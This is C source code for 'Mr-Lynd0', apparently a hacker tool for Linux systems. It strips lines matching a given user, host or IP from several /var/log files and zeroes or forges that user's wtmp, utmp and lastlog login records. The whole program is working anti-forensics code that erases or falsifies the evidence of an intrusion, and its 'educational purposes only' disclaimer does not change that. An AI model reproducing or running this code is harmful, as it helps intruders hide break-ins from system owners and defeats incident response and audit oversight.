/* Mr-Lynd0 is a log clener and an instrument to hide user or to change user and host.
 * cleans ip user and  host in log files /var/log/
 * hides yourself in a linux box editing wtmp and utmp
 * changes user host in wtmp utmp
 *
 * written by click <clikkone@box.it>
 *
 * This program is for educational purposes only!!
 */

#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/file.h>
#include <fcntl.h>
#include <utmp.h>
#include <pwd.h>
#include <lastlog.h>

#define WTMP_NAME "/var/log/wtmp"
#define UTMP_NAME "/var/run/utmp"
#define LASTLOG_NAME "/var/log/lastlog"
#define MESSAGES "/var/log/messages"
#define SECURE "/var/log/secure"
#define MAILLOG "/var/log/maillog"
#define XFERLOG "/var/log/xferlog"
#define PROFTPD "/var/log/proftpd.log"
#define MAXBUFF 8*1024 

int f;
void clear_log(char *user,char *host,char *ip_host) //This function has been already used in a log cleaner written by FuSyS www.s0ftpj.org

{
  int i;
  char buffer[MAXBUFF];

  FILE *log;
  FILE *log1;
  FILE *log2;
  FILE *log3;
  FILE *log4;
  FILE *log5;

  FILE *flog;
  char *logs[] = {MESSAGES, SECURE, XFERLOG, MAILLOG, PROFTPD};
  char *flogs[] = {"messages.hm", "secure.hm", "xferlog.hm", "maillog.hm", "proftpd.log.hm"};


  for (i=0;i<5;i++) 
    {
      log = fopen (logs[i], "r") ;
      if (log == 0)
	{
	  fprintf(stderr, " - I can't find %s\tFAILED.\n", logs[i]);
	  continue;
	}
      flog = fopen (flogs[i], "w");
      if (flog == 0)
	{
	  fprintf(stderr, " - I can't find var\tFAILED.\n");
	  continue;
	}
      else 
	{
	  printf ("Working on %s\t",logs[i]);
	  while (fgets(buffer, MAXBUFF,log) != NULL){
	    if ((!strstr(buffer,user)) && (!strstr(buffer,host)) && (!strstr(buffer,ip_host)))
	      {
		fputs(buffer,flog);
	      }
	  }
	}
      fclose (log);
      fclose (flog);
      printf ("\tDONE.\n");
    }

  log1 = fopen(logs[0], "r");

  if ( log1 != 0 )
    {
      system ("mv messages.hm /var/log/messages");
      fclose(log1);
    }

  log2 = fopen(logs[1], "r");

  if ( log2 != 0 )
    {
      system ("mv secure.hm /var/log/secure");
      fclose(log2);
    }

  log3 = fopen(logs[2], "r");

  if (log3 != 0 )
    {
      system ("mv xferlog.hm /var/log/xferlog");
      fclose(log3);
    }

  log4 = fopen(logs[3], "r");

  if (log4 != 0 )
    {
      system ("mv maillog.hm /var/log/maillog");
      fclose(log4);
    }

  log5 = fopen(logs[4], "r");

  if (log5 != 0 )
    {

      system ("mv proftpd.log.hm /var/log/proftpd.log");
      fclose(log5);
    }



}



void modify_wtmp2(who)
     char *who;
{
  struct utmp utmp_ent;
  long pos;
  
  pos = 1L;
  if ((f=open(WTMP_NAME,O_RDWR))>=0) {
    
    while(pos != -1L) {
      lseek(f,-(long)( (sizeof(struct utmp)) * pos),L_XTND);
      if (read (f, &utmp_ent, sizeof (struct utmp))<0) {
	pos = -1L;
      } else {
	if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
	  bzero((char *)&utmp_ent,sizeof(struct utmp ));
	  lseek(f,-( (sizeof(struct utmp)) * pos),L_XTND);
	  write (f, &utmp_ent, sizeof (utmp_ent));
	  pos = -1L;
	} else pos += 1L;
      }
    }
    close(f);
  }
  printf ("wtmp\t\t\t\t\tDONE.\n");
}
void modify_utmp2(who)
     char *who;
{
  struct utmp utmp_ent;
  
  if ((f=open(UTMP_NAME,O_RDWR))>=0) {     
    while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
      if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
	bzero((char *)&utmp_ent,sizeof( utmp_ent ));
	lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
	write (f, &utmp_ent, sizeof (utmp_ent));
      }
    close(f);
  }
  printf ("utmp\t\t\t\t\tDONE.\n");
}


void modify_utmp(who,fakew,fake)
     char *who;
     char *fakew;
     char *fake;
{
  struct utmp utmp_ent;
  
  if ((f=open(UTMP_NAME,O_RDWR))>=0) {     
    while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
      if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
	memcpy(utmp_ent.ut_host,fake,sizeof(utmp_ent.ut_host));
	memcpy(utmp_ent.ut_name,fakew,sizeof(utmp_ent.ut_name));
	
	
	
                 lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
                 write (f, &utmp_ent, sizeof (utmp_ent));
      }
    close(f);
  }
  printf ("utmp\t\t\t\t\tDONE.\n");
}

void modify_wtmp(who,fakew,fake)
     char *who;
     char *fakew;
     char *fake;
{
  struct utmp utmp_ent;
  long pos;
  
  pos = 1L;
  if ((f=open(WTMP_NAME,O_RDWR))>=0) {
    
    while(pos != -1L) {
      lseek(f,-(long)( (sizeof(struct utmp)) * pos),L_XTND);
      if (read (f, &utmp_ent, sizeof (struct utmp))<0) {
	pos = -1L;
      } else {
	if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
	  memcpy(utmp_ent.ut_host,fake,sizeof(utmp_ent.ut_host));
	  memcpy(utmp_ent.ut_name,fakew,sizeof(utmp_ent.ut_name));
	  lseek(f,-( (sizeof(struct utmp)) * pos),L_XTND);
	  write (f, &utmp_ent, sizeof (utmp_ent));
	  pos = -1L;
	} else pos += 1L;
      }
    }
    close(f);
  }
  printf ("wtmp\t\t\t\t\tDONE.\n");
}

void modify_lastlog(who)
     char *who;
{
  struct passwd *pass;
  struct lastlog newll;
  
  if ((pass=getpwnam(who))!=NULL) {
    
    if ((f=open(LASTLOG_NAME, O_RDWR)) >= 0) {
      lseek(f, (long)pass->pw_uid * sizeof (struct lastlog), 0);
      bzero((char *)&newll,sizeof( newll ));
      write(f, (char *)&newll, sizeof( newll ));
      close(f);
    }
    
  } else printf("%s: ?\n",who);
}

main(int argc,char *argv[])

{
  
  printf("\n");
  if (argc==4)
    {
      modify_lastlog(argv[1]);
      modify_wtmp2(argv[1]);
      modify_utmp2(argv[1]);
      clear_log(argv[1],argv[2],argv[3]);
      printf("\ndone Mr-Lynd0!\npowered by click & Tabris\n\n");
      exit();
    }
  else{
      if (argc==6) {
        modify_lastlog(argv[1]);
        modify_wtmp(argv[1],argv[2],argv[3]);
        modify_utmp(argv[1],argv[2],argv[3]);
	clear_log(argv[1],argv[4],argv[5]);
        printf("\ndone Mr-Lindo!\npowered by click & Tabris\n\n");
	exit();
      } else
	if (argc!=2 || argc!=4)
	  {

	    fprintf(stderr,"\tYou have failed!\n");
	    fprintf (stderr,"\tif you want to hide yourself and clean log files:\n\n");
	    fprintf(stderr,"\tusage %s <user> <host> <real_ip>\n",argv[0]);
	    fprintf(stderr,"\t if you want to change ip host user and clean logs:\n\n");
	    fprintf(stderr,"\tusage %s <user> <fake_user> <fake_host> <host> <real_ip>\n",argv[0]);
	  }
  }
}

